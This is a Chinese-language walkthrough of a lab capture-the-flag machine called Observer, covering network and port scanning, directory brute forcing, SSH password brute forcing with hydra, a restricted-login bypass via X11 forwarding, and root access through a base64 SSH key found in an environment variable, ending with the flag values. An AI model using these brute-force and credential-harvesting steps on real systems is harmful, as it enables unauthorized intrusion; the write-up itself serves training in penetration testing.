# 一、信息收集

## 1. 主机发现

首先，使用`arp-scan`在本地网络中发现目标主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.131 08:00:27:e7:c9:11       PCS Systemtechnik GmbH
...
```

确认目标主机IP地址为 `192.168.205.131`。

## 2. 端口扫描

使用 `nmap` 对目标主机进行全端口扫描和服务版本探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- -A 192.168.205.131           
Starting Nmap 7.95 ( https://nmap.org )
...
Nmap scan report for 192.168.205.131
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
MAC Address: 08:00:27:E7:C9:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
```

扫描结果显示开放了 **22 (SSH)** 和 **80 (HTTP)** 两个端口。

# 二、Web渗透

## 1. 虚拟主机发现

直接访问 `http://192.168.205.131` 显示的是 Apache 的默认页面。通过目录爆破可以获得一些目录信息。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.131 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64  
...
/index.html           (Status: 200) [Size: 35742]
/images               (Status: 301) [Size: 319] [--> http://192.168.205.131/images/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.205.131/css/]
/js                   (Status: 301) [Size: 315] [--> http://192.168.205.131/js/]
/fonts                (Status: 301) [Size: 318] [--> http://192.168.205.131/fonts/]
...
```

通过查看`/image`中的图片文件，可以发现，他使用的图片内容貌似是web网站模板的图片，所以猜测可能存在域名。将域名 `Observer.nlx` 绑定到IP。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts

# 在文件末尾添加
192.168.205.131 Observer.nlx
```

## 2. Web信息枚举

访问 `http://Observer.nlx`，网站是一个静态的网页模板。在对网站目录进行爆破后未发现敏感文件，但在主页`index.html`的源码中，“Our Team”部分发现了几个可疑的用户名。


![image-20250810130421280](http://7r1UMPHK.github.io/image/20250810130421538.webp)

从源码中，我们提取到以下潜在用户名：
*   **john**
*   **mike**
*   **remo**
*   **niscal**

# 三、主机渗透与立足点

## 1. SSH爆破

利用上一步发现的用户名列表，结合弱口令字典，对SSH服务进行爆破攻击。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat user.txt
john
mike
remo
niscal

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ hydra -L user.txt -P /path/to/passwords.txt ssh://192.168.205.131 -t 64
...
[22][ssh] host: 192.168.205.131   login: niscal   password: niscal
...
```

成功爆破出用户 `niscal` 的密码为 `niscal`。

## 2. 受限Shell绕过

尝试使用获取的凭证登录SSH。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh niscal@192.168.205.131
niscal@192.168.205.131's password: 

########################################
# Dear person,                         #
# Not now! I'm busy with the terminal. #
# by Niscal                            #
########################################

Connection to 192.168.205.131 closed.
```

登录后连接立即被关闭，并显示一条关键信息 **"I'm busy with the terminal."**。这强烈暗示当前登录的会话不被认为是“真正的终端”，因此被限制脚本拒绝。

## 3. X11转发攻击

根据提示，我们尝试使用SSH的X11转发功能 (`-X` 或 `-Y`) 来请求一个图形化会话，这很可能绕过限制脚本。

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -X niscal@192.168.205.131 
niscal@192.168.205.131's password: 
...
```

![image-20250810125226283](http://7r1UMPHK.github.io/image/20250810125233587.webp)

成功显示，并且显示了下面内容。

```
niscal@observer:~$ echo -n REMOisGOD | passwd remo
```

经过尝试该X11 shell在输入命令回车就会断开。

# 四、权限提升

## 1. 横向移动 (niscal -> remo)

使用显示的用户名`remo`和密码`REMOisGOD`进行登录。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ssh remo@192.168.205.131
remo@192.168.205.131's password: 
...
remo@observer:~$ id
uid=1001(remo) gid=1001(remo) groups=1001(remo)
```

成功切换到 `remo` 用户。

## 2. 提权至root

在 `remo` 用户下进行信息收集，检查环境变量时发现了一个重大线索。

```bash
remo@observer:~$ env
...
rootKEY=LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K... (此处省略了超长的Base64字符串)
...
```

环境变量 `rootKEY` 包含一个Base64编码的字符串，看起来像是一个SSH私钥。我们将其解码并保存。

```bash
remo@observer:~$ echo 'LS0tLS1...LS0tCg==' | base64 -d > id_rsa
remo@observer:~$ chmod 600 id_rsa
```

使用这个私钥尝试以 `root` 用户身份登录本地SSH服务。

```bash
remo@observer:~$ ssh root@127.0.0.1 -i id_rsa
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
root@observer:~# id
uid=0(root) gid=0(root) groups=0(root)
```

成功提权至 `root` 用户！

# 五、获取Flag

现在我们拥有了所有权限，可以读取所有的Flag。

```bash
root@observer:~# cat /root/root.txt
fa40a17de09827a5ae20a894304c6a49

root@observer:~# cat /home/remo/user.txt 
f2edafebb9851d806ff15deb0477ebe8
```

所有Flag均已找到，渗透测试完成。